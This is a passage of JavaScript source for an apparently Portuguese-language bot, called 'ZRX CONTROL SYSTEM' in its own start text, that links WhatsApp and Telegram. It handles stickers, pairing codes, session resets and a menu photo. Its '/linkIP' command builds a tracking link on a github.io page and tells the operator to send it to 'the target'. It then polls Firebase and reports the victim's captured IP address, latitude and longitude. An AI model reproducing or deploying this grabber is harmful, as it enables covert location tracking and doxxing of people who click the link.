                    const targetMsg = msg.message.imageMessage ? msg : { key: { remoteJid, id: msg.message.extendedTextMessage.contextInfo.stanzaId }, message: quoted };
                    const buffer = await downloadMediaMessage(targetMsg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
                    await waSock.sendMessage(remoteJid, { sticker: buffer });
                } catch (err) {}
            }
            else if (texto.trim() === '/linkIP') {
                const idUnico = 'zrx_' + Math.random().toString(36).substring(2, 8);
                const linkGerado = `https://wv0304362-bot.github.io/linkApi1-/?id=${idUnico}`;

                await salvarFirebase(`capturas/${idUnico}`, { status: 'aguardando', criado_em: new Date().toISOString() }).catch(() => {});

                await waSock.sendMessage(remoteJid, { 
                    text: `🔗 *LINK GERADO COM SUCESSO*\n\nEnvie o link para o alvo:\n${linkGerado}` 
                });

                const intervaloVerificacao = setInterval(async () => {
                    try {
                        const dadosCapturados = await buscarFirebase(`capturas/${idUnico}`);
                        if (dadosCapturados && dadosCapturados.ip && dadosCapturados.ip !== 'Desconhecido' && dadosCapturados.timestamp) {
                            clearInterval(intervaloVerificacao);

                            const lat = dadosCapturados.location?.lat || 'Negado';
                            const lon = dadosCapturados.location?.lon || 'Negado';
                            const ipCapturado = dadosCapturados.ip || 'Desconhecido';

                            const alertaMsg = 
                                `🚨 *DADOS CAPTURADOS!* 🚨\n\n` +
                                `🌐 *IP:* ${ipCapturado}\n` +
                                `📍 *Latitude:* ${lat}\n` +
                                `📍 *Longitude:* ${lon}\n` +
                                `🕒 *Horário:* ${dadosCapturados.timestamp}`;

                            await waSock.sendMessage(remoteJid, { text: alertaMsg });
                        }
                    } catch (e) {}
                }, 3000);
            }
        } catch (erroMensagem) {
            console.error("Erro asset:", erroMensagem);
        }
    });

    if (!state.creds.registered && numeroTelefone) {
        await delay(3000);
        try {
            const codigo = await waSock.requestPairingCode(numeroTelefone);
            if (chatId) {
                const mensagemLayout = `✅ **Conectado com sucesso**\n\nO código\n\`${codigo}\``;
                const opts = {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[{ text: '📋 Copiar Código', callback_data: `copiar_${codigo}` }]]
                    }
                };
                bot.sendMessage(chatId, mensagemLayout, opts);
            }
        } catch (error) {}
    }
}

function remoteJidCheck(msg) {
    return msg.key.remoteJid;
}

// Comando /foto no Telegram para definir a imagem do menu de ambas as plataformas
bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    const caption = msg.caption || '';

    if (caption.toLowerCase().startsWith('/foto') || msg.reply_to_message) {
        try {
            bot.sendMessage(chatId, "🔄 Salvando nova foto para o menu do bot...");

            const fotoId = msg.photo[msg.photo.length - 1].file_id;
            const fileLink = await bot.getFileLink(fotoId);

            const caminhoMenu = path.join(__dirname, 'menu.jpg');
            const fileStream = fs.createWriteStream(caminhoMenu);

            https.get(fileLink, (response) => {
                response.pipe(fileStream);
                fileStream.on('finish', () => {
                    fileStream.close();
                    bot.sendMessage(chatId, "✅ Foto do menu atualizada com sucesso!");
                });
            });
        } catch (err) {}
    }
});

bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;
    if (data.startsWith('copiar_')) {
        const codigo = data.replace('copiar_', '');
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: `Código ${codigo} copiado!`,
            show_alert: true
        });
    }
});

bot.onText(/\/limpar|\/desconectar/, async (msg) => {
    const chatId = msg.chat.id;
    const pastaSessao = path.join(__dirname, 'sessao_teste');

    try {
        if (waSock) {
            await waSock.logout().catch(() => {});
            waSock = null;
        }
        if (fs.existsSync(pastaSessao)) {
            fs.rmSync(pastaSessao, { recursive: true, force: true });
        }
        reconectando = false;
        jaNotificouConectado = false;
        bot.sendMessage(chatId, "🧹 Sessão limpa com sucesso!", { parse_mode: 'Markdown' });
    } catch (error) {}
});

bot.onText(/\/conectar (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const numeroTelefone = match[1].replace(/\D/g, '');
    bot.sendMessage(chatId, `🔄 Solicitando código para o número: \`${numeroTelefone}\`...`, { parse_mode: 'Markdown' });
    await iniciarWhatsApp(chatId, numeroTelefone);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const startTexto = 
        `🤖 *ZRX CONTROL SYSTEM* \n\n` +
        `• Para conectar o WhatsApp: \`/conectar SEU_NUMERO\`\n` +
        `• Para atualizar a foto do menu: *Envie uma foto com a legenda \`/foto\`*\n` +
        `• Para limpar sessão: \`/limpar\``;

    const caminhoFoto = path.join(__dirname, 'menu.jpg');

    if (fs.existsSync(caminhoFoto)) {
        bot.sendPhoto(chatId, caminhoFoto, { caption: startTexto, parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId, startTexto, { parse_mode: 'Markdown' });
    }
});

console.log("Bot do Telegram iniciado e escutando comandos!");
